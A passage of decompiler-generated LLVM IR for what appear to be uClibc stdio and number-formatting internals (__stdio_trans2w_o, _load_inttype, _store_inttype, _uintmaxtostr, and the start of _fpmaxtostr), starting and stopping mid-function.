  %v4_8061485 = inttoptr i32 %v0_806147a to i16*
  %v5_8061485 = call i32 @__stdio_WRITE(i16* %v4_8061485, i32 %v0_8061472, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8061485, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806148a

dec_label_pc_806148a:                             ; preds = %dec_label_pc_8061433, %dec_label_pc_806141b, %dec_label_pc_806140a, %dec_label_pc_80613f1, %dec_label_pc_806146e, %dec_label_pc_806144c, %dec_label_pc_80613d7, %dec_label_pc_8061472
  %v0_806148d = load i32, i32* @edi, align 4
  store i32 %v0_806148d, i32* %eax.global-to-local, align 4
  %v2_806148f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806148f, i32* @ebx, align 4
  store i32 %v0_80613a6, i32* @esi, align 4
  store i32 %v0_80613a5, i32* @edi, align 4
  store i32 %v0_80613a4, i32* @ebp, align 4
  ret i32 %v0_806148d

; uselistorder directives
  uselistorder i32 %v2_8061450, { 1, 0 }
  uselistorder i32 %v4_806143e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8061435, { 1, 0, 2 }
  uselistorder i32 %v0_806142b, { 3, 0, 1, 2 }
  uselistorder i32 %v2_80613eb, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_80613a6, { 1, 0 }
  uselistorder i32 %v0_80613a5, { 1, 0 }
  uselistorder i32 %v0_80613a4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_806148a, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8061433, { 1, 0 }
  uselistorder label %dec_label_pc_80613d7, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8061494 = load i32, i32* @ebx, align 4
  %v4_8061498 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8061498, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_80614a0 = bitcast i16* %arg1 to i32*
  %v2_80614a0 = load i32, i32* %v1_80614a0, align 4
  store i32 %v2_80614a0, i32* %eax.global-to-local, align 4
  %v1_80614a2 = urem i32 %v2_80614a0, 65536
  store i32 %v1_80614a2, i32* %edx.global-to-local, align 4
  %v2_80614a5 = and i32 %v1_80614a2, %arg2
  %v3_80614a5 = icmp eq i32 %v2_80614a5, 0
  %v1_80614a7 = icmp eq i1 %v3_80614a5, false
  br i1 %v1_80614a7, label %dec_label_pc_80614b6, label %dec_label_pc_80614a9

dec_label_pc_80614a9:                             ; preds = %entry
  %v1_80614a9 = and i32 %v2_80614a0, 2176
  %v2_80614a9 = icmp eq i32 %v1_80614a9, 0
  store i32 %v1_80614a9, i32* %edx.global-to-local, align 4
  %v1_80614af = icmp eq i1 %v2_80614a9, false
  br i1 %v1_80614af, label %dec_label_pc_80614be, label %dec_label_pc_80614b1

dec_label_pc_80614b1:                             ; preds = %dec_label_pc_80614a9
  %v2_80614b1 = or i32 %v2_80614a0, %arg2
  store i32 %v2_80614b1, i32* %eax.global-to-local, align 4
  %v1_80614b3 = trunc i32 %v2_80614b1 to i16
  store i16 %v1_80614b3, i16* %arg1, align 2
  %v0_80614b6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80614b6

dec_label_pc_80614b6:                             ; preds = %entry, %dec_label_pc_80614b1
  %v0_80614fb = phi i32 [ %v4_8061498, %entry ], [ %v0_80614b6.pre, %dec_label_pc_80614b1 ]
  %v1_80614b6 = inttoptr i32 %v0_80614fb to i16*
  %v2_80614b6 = load i16, i16* %v1_80614b6, align 2
  %v3_80614b6 = zext i16 %v2_80614b6 to i32
  store i32 %v3_80614b6, i32* %edx.global-to-local, align 4
  %v2_80614b9 = and i16 %v2_80614b6, 32
  %v3_80614b9 = icmp eq i16 %v2_80614b9, 0
  br i1 %v3_80614b9, label %dec_label_pc_80614d2, label %dec_label_pc_80614be

dec_label_pc_80614be:                             ; preds = %dec_label_pc_80614b6, %dec_label_pc_80614a9
  %v1_80614be = call i32 @__errno_location(i32 %v0_8061494)
  store i32 %v1_80614be, i32* %eax.global-to-local, align 4
  %v1_80614c3 = inttoptr i32 %v1_80614be to i32*
  store i32 9, i32* %v1_80614c3, align 4
  br label %dec_label_pc_80614c9

dec_label_pc_80614c9:                             ; preds = %dec_label_pc_80614e9, %dec_label_pc_80614be
  %v0_80614c9 = load i32, i32* @ebx, align 4
  %v1_80614c9 = inttoptr i32 %v0_80614c9 to i16*
  %v2_80614c9 = load i16, i16* %v1_80614c9, align 2
  %v3_80614c9 = or i16 %v2_80614c9, 8
  store i16 %v3_80614c9, i16* %v1_80614c9, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806152c

dec_label_pc_80614d2:                             ; preds = %dec_label_pc_80614b6
  %v2_80614d2 = urem i16 %v2_80614b6, 4
  %v3_80614d2 = icmp eq i16 %v2_80614d2, 0
  br i1 %v3_80614d2, label %dec_label_pc_8061518, label %dec_label_pc_80614d7

dec_label_pc_80614d7:                             ; preds = %dec_label_pc_80614d2
  %v2_80614d7 = and i32 %v3_80614b6, 4
  %v3_80614d7 = icmp eq i32 %v2_80614d7, 0
  %v1_80614da = icmp eq i1 %v3_80614d7, false
  br i1 %v1_80614da, label %dec_label_pc_8061508, label %dec_label_pc_80614dc

dec_label_pc_80614dc:                             ; preds = %dec_label_pc_80614d7
  %v1_80614dc = add i32 %v0_80614fb, 20
  %v2_80614dc = inttoptr i32 %v1_80614dc to i32*
  %v3_80614dc = load i32, i32* %v2_80614dc, align 4
  store i32 %v3_80614dc, i32* %eax.global-to-local, align 4
  %v2_80614df = add i32 %v0_80614fb, 16
  %v3_80614df = inttoptr i32 %v2_80614df to i32*
  %v4_80614df = load i32, i32* %v3_80614df, align 4
  %v15_80614df = icmp eq i32 %v3_80614dc, %v4_80614df
  %v1_80614e2 = icmp eq i1 %v15_80614df, false
  br i1 %v1_80614e2, label %dec_label_pc_80614e9, label %dec_label_pc_80614e4

dec_label_pc_80614e4:                             ; preds = %dec_label_pc_80614dc
  %v2_80614e4 = and i32 %v3_80614b6, 2
  %v3_80614e4 = icmp eq i32 %v2_80614e4, 0
  br i1 %v3_80614e4, label %dec_label_pc_8061508, label %dec_label_pc_80614e9

dec_label_pc_80614e9:                             ; preds = %dec_label_pc_80614e4, %dec_label_pc_80614dc
  %v1_80614e9 = and i32 %v3_80614b6, 1024
  store i32 %v1_80614e9, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_80614e9, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_80614fc = call i32 @__GI_fseek(i32 %v0_80614fb, i32 0, i32 %tmp18, i32 %v1_80614e9)
  store i32 %v5_80614fc, i32* %eax.global-to-local, align 4
  %v1_8061504 = icmp eq i32 %v5_80614fc, 0
  %v1_8061506 = icmp eq i1 %v1_8061504, false
  br i1 %v1_8061506, label %dec_label_pc_80614c9, label %dec_label_pc_80614e9.dec_label_pc_8061508_crit_edge

dec_label_pc_80614e9.dec_label_pc_8061508_crit_edge: ; preds = %dec_label_pc_80614e9
  %v0_8061508.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061508

dec_label_pc_8061508:                             ; preds = %dec_label_pc_80614e9.dec_label_pc_8061508_crit_edge, %dec_label_pc_80614e4, %dec_label_pc_80614d7
  %v10_8061508 = phi i32 [ %v0_8061508.pre, %dec_label_pc_80614e9.dec_label_pc_8061508_crit_edge ], [ %v0_80614fb, %dec_label_pc_80614e4 ], [ %v0_80614fb, %dec_label_pc_80614d7 ]
  %v1_8061508 = inttoptr i32 %v10_8061508 to i16*
  %v2_8061508 = load i16, i16* %v1_8061508, align 2
  %v3_8061508 = and i16 %v2_8061508, -4
  store i16 %v3_8061508, i16* %v1_8061508, align 2
  %v0_806150c = load i32, i32* @ebx, align 4
  %v1_806150c = add i32 %v0_806150c, 8
  %v2_806150c = inttoptr i32 %v1_806150c to i32*
  %v3_806150c = load i32, i32* %v2_806150c, align 4
  store i32 %v3_806150c, i32* %eax.global-to-local, align 4
  %v2_806150f = add i32 %v0_806150c, 24
  %v3_806150f = inttoptr i32 %v2_806150f to i32*
  store i32 %v3_806150c, i32* %v3_806150f, align 4
  %v0_8061512 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061512 = load i32, i32* @ebx, align 4
  %v2_8061512 = add i32 %v1_8061512, 16
  %v3_8061512 = inttoptr i32 %v2_8061512 to i32*
  store i32 %v0_8061512, i32* %v3_8061512, align 4
  %v0_8061515 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061515 = load i32, i32* @ebx, align 4
  %v2_8061515 = add i32 %v1_8061515, 20
  %v3_8061515 = inttoptr i32 %v2_8061515 to i32*
  store i32 %v0_8061515, i32* %v3_8061515, align 4
  %v0_8061518.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061518

dec_label_pc_8061518:                             ; preds = %dec_label_pc_80614d2, %dec_label_pc_8061508
  %v9_8061518 = phi i32 [ %v0_80614fb, %dec_label_pc_80614d2 ], [ %v0_8061518.pre, %dec_label_pc_8061508 ]
  %v1_8061518 = inttoptr i32 %v9_8061518 to i16*
  %v2_8061518 = load i16, i16* %v1_8061518, align 2
  %v3_8061518 = or i16 %v2_8061518, 64
  store i16 %v3_8061518, i16* %v1_8061518, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_806151e = load i32, i32* @ebx, align 4
  %v1_806151e = inttoptr i32 %v0_806151e to i16*
  %v2_806151e = load i16, i16* %v1_806151e, align 2
  %v3_806151e = zext i16 %v2_806151e to i32
  store i32 %v3_806151e, i32* %eax.global-to-local, align 4
  %v3_8061521 = and i16 %v2_806151e, 2816
  %v4_8061521 = icmp eq i16 %v3_8061521, 0
  %v1_8061524 = icmp eq i1 %v4_8061521, false
  br i1 %v1_8061524, label %dec_label_pc_806152c, label %dec_label_pc_8061526

dec_label_pc_8061526:                             ; preds = %dec_label_pc_8061518
  %v1_8061526 = add i32 %v0_806151e, 12
  %v2_8061526 = inttoptr i32 %v1_8061526 to i32*
  %v3_8061526 = load i32, i32* %v2_8061526, align 4
  store i32 %v3_8061526, i32* %eax.global-to-local, align 4
  %v2_8061529 = add i32 %v0_806151e, 28
  %v3_8061529 = inttoptr i32 %v2_8061529 to i32*
  store i32 %v3_8061526, i32* %v3_8061529, align 4
  %v0_806152c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806152c

dec_label_pc_806152c:                             ; preds = %dec_label_pc_8061518, %dec_label_pc_80614c9, %dec_label_pc_8061526
  %v0_806152c = phi i32 [ 0, %dec_label_pc_8061518 ], [ -1, %dec_label_pc_80614c9 ], [ %v0_806152c.pre, %dec_label_pc_8061526 ]
  store i32 %v0_806152c, i32* %eax.global-to-local, align 4
  %v2_806152e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_806152e, i32* @edx, align 4
  store i32 %v0_8061494, i32* @ebx, align 4
  ret i32 %v0_806152c

; uselistorder directives
  uselistorder i32 %v0_806152c, { 1, 0 }
  uselistorder i32 %v0_806151e, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_80614e9, { 1, 0, 2 }
  uselistorder i32 %v0_80614fb, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_80614a2, { 1, 0 }
  uselistorder i32 %v2_80614a0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8061494, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806152c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061518, { 1, 0 }
  uselistorder label %dec_label_pc_80614b6, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_806153c = icmp slt i32 %tmp, 0
  %v3_8061565 = and i32 %tmp5, 2048
  %v4_8061565 = icmp eq i32 %v3_8061565, 0
  br i1 %v5_806153c, label %dec_label_pc_8061565, label %dec_label_pc_8061543

dec_label_pc_8061543:                             ; preds = %entry
  %v1_8061546 = icmp eq i1 %v4_8061565, false
  br i1 %v1_8061546, label %dec_label_pc_806156a, label %dec_label_pc_8061548

dec_label_pc_8061548:                             ; preds = %dec_label_pc_8061543
  %v1_8061548 = inttoptr i32 %tmp4 to i32*
  %v2_8061548 = load i32, i32* %v1_8061548, align 4
  %v6_806154a = icmp eq i32 %tmp5, 256
  %v1_8061550 = icmp eq i1 %v6_806154a, false
  br i1 %v1_8061550, label %dec_label_pc_8061557, label %dec_label_pc_8061552

dec_label_pc_8061552:                             ; preds = %dec_label_pc_8061548
  %v1_8061552 = urem i32 %v2_8061548, 256
  br label %dec_label_pc_8061562

dec_label_pc_8061557:                             ; preds = %dec_label_pc_8061548
  %v6_8061557 = icmp eq i32 %tmp5, 512
  %v1_806155d = icmp eq i1 %v6_8061557, false
  br i1 %v1_806155d, label %dec_label_pc_8061562, label %dec_label_pc_806155f

dec_label_pc_806155f:                             ; preds = %dec_label_pc_8061557
  %v1_806155f = urem i32 %v2_8061548, 65536
  br label %dec_label_pc_8061562

dec_label_pc_8061562:                             ; preds = %dec_label_pc_8061557, %dec_label_pc_8061552, %dec_label_pc_806155f
  %v0_8061564 = phi i32 [ %v2_8061548, %dec_label_pc_8061557 ], [ %v1_8061552, %dec_label_pc_8061552 ], [ %v1_806155f, %dec_label_pc_806155f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8061564

dec_label_pc_8061565:                             ; preds = %entry
  br i1 %v4_8061565, label %dec_label_pc_8061570, label %dec_label_pc_806156a

dec_label_pc_806156a:                             ; preds = %dec_label_pc_8061565, %dec_label_pc_8061543
  %v1_806156a = add i32 %tmp4, 4
  %v2_806156a = inttoptr i32 %v1_806156a to i32*
  %v3_806156a = load i32, i32* %v2_806156a, align 4
  store i32 %v3_806156a, i32* @edx, align 4
  %v1_806156d = inttoptr i32 %tmp4 to i32*
  %v2_806156d = load i32, i32* %v1_806156d, align 4
  ret i32 %v2_806156d

dec_label_pc_8061570:                             ; preds = %dec_label_pc_8061565
  %v1_8061570 = inttoptr i32 %tmp4 to i32*
  %v2_8061570 = load i32, i32* %v1_8061570, align 4
  %v6_8061572 = icmp eq i32 %tmp5, 256
  %v1_8061578 = icmp eq i1 %v6_8061572, false
  br i1 %v1_8061578, label %dec_label_pc_806157f, label %dec_label_pc_806157a

dec_label_pc_806157a:                             ; preds = %dec_label_pc_8061570
  %v1_806157a = mul i32 %v2_8061570, 16777216
  %v2_806157a = sdiv i32 %v1_806157a, 16777216
  br label %dec_label_pc_8061588

dec_label_pc_806157f:                             ; preds = %dec_label_pc_8061570
  %v6_806157f = icmp eq i32 %tmp5, 512
  %v1_8061585 = icmp eq i1 %v6_806157f, false
  br i1 %v1_8061585, label %dec_label_pc_8061588, label %dec_label_pc_8061587

dec_label_pc_8061587:                             ; preds = %dec_label_pc_806157f
  %v1_8061587 = mul i32 %v2_8061570, 65536
  %v2_8061587 = sdiv i32 %v1_8061587, 65536
  br label %dec_label_pc_8061588

dec_label_pc_8061588:                             ; preds = %dec_label_pc_806157f, %dec_label_pc_806157a, %dec_label_pc_8061587
  %v0_8061588 = phi i32 [ %v2_8061570, %dec_label_pc_806157f ], [ %v2_806157a, %dec_label_pc_806157a ], [ %v2_8061587, %dec_label_pc_8061587 ]
  %v1_8061588 = ashr i32 %v0_8061588, 31
  store i32 %v1_8061588, i32* @edx, align 4
  ret i32 %v0_8061588

; uselistorder directives
  uselistorder i32 %v0_8061588, { 1, 0 }
  uselistorder i32 %v2_8061570, { 2, 0, 1 }
  uselistorder i32 %v2_8061548, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8061588, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061562, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_1()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_806158c = load i32, i32* @ebx, align 4
  store i32 %v0_806158c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8061591 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8061591, i32* %ebx.global-to-local, align 4
  %v4_8061595 = trunc i32 %tmp4 to i16
  %v6_806159d = icmp eq i32 %tmp6, 256
  %v1_80615a3 = icmp eq i1 %v6_806159d, false
  br i1 %v1_80615a3, label %dec_label_pc_80615a9, label %dec_label_pc_80615a5

dec_label_pc_80615a5:                             ; preds = %entry
  %v2_80615a5 = trunc i32 %tmp4 to i8
  %v4_80615a5 = bitcast i16* %tmp5 to i8*
  store i8 %v2_80615a5, i8* %v4_80615a5, align 1
  br label %dec_label_pc_80615c7

dec_label_pc_80615a9:                             ; preds = %entry
  %v6_80615a9 = icmp eq i32 %tmp6, 2048
  %v1_80615af = icmp eq i1 %v6_80615a9, false
  br i1 %v1_80615af, label %dec_label_pc_80615b8, label %dec_label_pc_80615b1

dec_label_pc_80615b1:                             ; preds = %dec_label_pc_80615a9
  %sext2 = mul i32 %tmp4, 65536
  %v1_80615b1 = sdiv i32 %sext2, 65536
  %v3_80615b1 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80615b1, i32* %v3_80615b1, align 4
  %v0_80615b3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80615b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80615b3 = add i32 %v1_80615b3, 4
  %v3_80615b3 = inttoptr i32 %v2_80615b3 to i32*
  store i32 %v0_80615b3, i32* %v3_80615b3, align 4
  br label %dec_label_pc_80615c7

dec_label_pc_80615b8:                             ; preds = %dec_label_pc_80615a9
  %v6_80615b8 = icmp eq i32 %tmp6, 512
  %v1_80615be = icmp eq i1 %v6_80615b8, false
  br i1 %v1_80615be, label %dec_label_pc_80615c5, label %dec_label_pc_80615c0

dec_label_pc_80615c0:                             ; preds = %dec_label_pc_80615b8
  store i16 %v4_8061595, i16* %tmp5, align 2
  br label %dec_label_pc_80615c7

dec_label_pc_80615c5:                             ; preds = %dec_label_pc_80615b8
  %sext3 = mul i32 %tmp4, 65536
  %v1_80615c5 = sdiv i32 %sext3, 65536
  %v3_80615c5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80615c5, i32* %v3_80615c5, align 4
  br label %dec_label_pc_80615c7

dec_label_pc_80615c7:                             ; preds = %dec_label_pc_80615c0, %dec_label_pc_80615b1, %dec_label_pc_80615a5, %dec_label_pc_80615c5
  %v2_80615c7 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80615c7, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_80615c8 = sdiv i32 %sext, 65536
  ret i32 %v1_80615c8

; uselistorder directives
  uselistorder label %dec_label_pc_80615c7, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_80615d7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80615d7, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80615e3 = icmp slt i32 %arg4, 0
  %v1_80615e5 = icmp eq i1 %v2_80615e3, false
  br i1 %v1_80615e5, label %dec_label_pc_8061606, label %dec_label_pc_80615e7

dec_label_pc_80615e7:                             ; preds = %entry
  %v1_80615e7 = sub i32 0, %arg4
  store i32 %v1_80615e7, i32* %esi.global-to-local, align 4
  %v2_80615e9 = icmp slt i32 %arg3, 0
  %v1_80615eb = icmp eq i1 %v2_80615e9, false
  br i1 %v1_80615eb, label %dec_label_pc_8061606, label %dec_label_pc_80615ed

dec_label_pc_80615ed:                             ; preds = %dec_label_pc_80615e7
  %v1_80615ed = sub i32 0, %arg2
  %v5_80615ed = icmp ne i32 %arg2, 0
  store i32 %v1_80615ed, i32* %ecx.global-to-local, align 4
  %v2_80615ef = zext i1 %v5_80615ed to i32
  %v3_80615ef = add i32 %v2_80615ef, %arg3
  %v1_80615fa = sub i32 0, %v3_80615ef
  store i32 %v1_80615fa, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061606

dec_label_pc_8061606:                             ; preds = %entry, %dec_label_pc_80615e7, %dec_label_pc_80615ed
  %v0_806160b = phi i32 [ %v1_80615e7, %dec_label_pc_80615ed ], [ %v1_80615e7, %dec_label_pc_80615e7 ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_80615ed ], [ 0, %dec_label_pc_80615e7 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_806160b
  %tmp35 = urem i32 -1, %v0_806160b
  %v1_806160d = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8061611 = load i32, i32* %esi.global-to-local, align 4
  %v12_8061611 = icmp eq i32 %v1_806160d, %v1_8061611
  %v1_806161b = icmp eq i1 %v12_8061611, false
  br i1 %v1_806161b, label %dec_label_pc_806162a, label %dec_label_pc_806161d

dec_label_pc_806161d:                             ; preds = %dec_label_pc_8061606
  %v1_806161d = add i32 %div, 1
  br label %dec_label_pc_806162a

dec_label_pc_806162a:                             ; preds = %dec_label_pc_8061606, %dec_label_pc_806161d
  %stack_var_-20.0.off0 = phi i32 [ %v1_806160d, %dec_label_pc_8061606 ], [ 0, %dec_label_pc_806161d ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8061606 ], [ %v1_806161d, %dec_label_pc_806161d ]
  %v0_806162a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_806162a, i32* %ebp.global-to-local, align 4
  %v0_806162c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_806162c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8061632

dec_label_pc_8061632:                             ; preds = %dec_label_pc_8061671, %dec_label_pc_806162a
  %v0_8061669 = phi i32 [ %v0_8061682, %dec_label_pc_8061671 ], [ %v0_806162a, %dec_label_pc_806162a ]
  %v0_8061636 = phi i32 [ %v1_8061684, %dec_label_pc_8061671 ], [ %v0_806162c, %dec_label_pc_806162a ]
  %v1_8061632 = icmp eq i32 %v0_8061636, 0
  br i1 %v1_8061632, label %dec_label_pc_8061669, label %dec_label_pc_8061636

dec_label_pc_8061636:                             ; preds = %dec_label_pc_8061632
  %v0_806163a = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8061636, %v0_806163a
  %tmp36 = urem i32 %v0_8061636, %v0_806163a
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8061669, %v0_806163a
  %tmp37 = urem i32 %v0_8061669, %v0_806163a
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_806164d = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8061651 = add i32 %tmp37, %v6_806164d
  %v8_8061657 = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_806165c = add i32 %div8, %v8_8061657
  store i32 %v2_806165c, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8061651, %v0_806163a
  %tmp38 = urem i32 %v2_8061651, %v0_806163a
  %v2_8061664 = add i32 %div9, %v2_806165c
  br label %dec_label_pc_8061671

dec_label_pc_8061669:                             ; preds = %dec_label_pc_8061632
  %v0_806166d = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_8061669, %v0_806166d
  %tmp39 = urem i32 %v0_8061669, %v0_806166d
  br label %dec_label_pc_8061671

dec_label_pc_8061671:                             ; preds = %dec_label_pc_8061636, %dec_label_pc_8061669
  %v0_8061677 = phi i32 [ %tmp38, %dec_label_pc_8061636 ], [ %tmp39, %dec_label_pc_8061669 ]
  %storemerge = phi i32 [ %v2_8061664, %dec_label_pc_8061636 ], [ %div12, %dec_label_pc_8061669 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8061671 = load i32, i32* %edi.global-to-local, align 4
  %v1_8061671 = add i32 %v0_8061671, -1
  store i32 %v1_8061671, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_8061677, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_8061677
  %v8_8061677 = trunc i32 %storemerge14.in to i8
  %v3_8061680 = inttoptr i32 %v1_8061671 to i8*
  store i8 %v8_8061677, i8* %v3_8061680, align 1
  %v0_8061682 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8061684 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061684 = or i32 %v1_8061684, %v0_8061682
  %v3_8061684 = icmp eq i32 %v2_8061684, 0
  %v1_8061686 = icmp eq i1 %v3_8061684, false
  br i1 %v1_8061686, label %dec_label_pc_8061632, label %dec_label_pc_8061688

dec_label_pc_8061688:                             ; preds = %dec_label_pc_8061671
  %v4_8061688 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_8061688, label %dec_label_pc_8061693, label %dec_label_pc_806168f

dec_label_pc_806168f:                             ; preds = %dec_label_pc_8061688
  %v0_806168f = load i32, i32* %edi.global-to-local, align 4
  %v1_806168f = add i32 %v0_806168f, -1
  store i32 %v1_806168f, i32* %edi.global-to-local, align 4
  %v1_8061690 = inttoptr i32 %v1_806168f to i8*
  store i8 45, i8* %v1_8061690, align 1
  br label %dec_label_pc_8061693

dec_label_pc_8061693:                             ; preds = %dec_label_pc_8061688, %dec_label_pc_806168f
  %v0_8061696 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8061696

; uselistorder directives
  uselistorder i32 %v2_8061651, { 1, 0 }
  uselistorder i32 %v0_806163a, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8061636, { 1, 0, 2 }
  uselistorder i32 %v0_8061669, { 1, 0, 3, 2 }
  uselistorder i32 %v1_806160d, { 1, 0 }
  uselistorder i32 %v0_806160b, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061693, { 1, 0 }
  uselistorder label %dec_label_pc_8061671, { 1, 0 }
  uselistorder label %dec_label_pc_806162a, { 1, 0 }
  uselistorder label %dec_label_pc_8061606, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_2()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80616a1 = load i32, i32* @edi, align 4
  %v0_80616a2 = load i32, i32* @esi, align 4
  %v0_80616a3 = load i32, i32* @ebx, align 4
  store i32 %v0_80616a3, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_80616b8 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_80616b8 = add i3 %v4_80616b8, -1
  store i3 %v5_80616b8, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80616bf = add i32 %tmp112, 4
  %v2_80616bf = inttoptr i32 %v1_80616bf to i32*
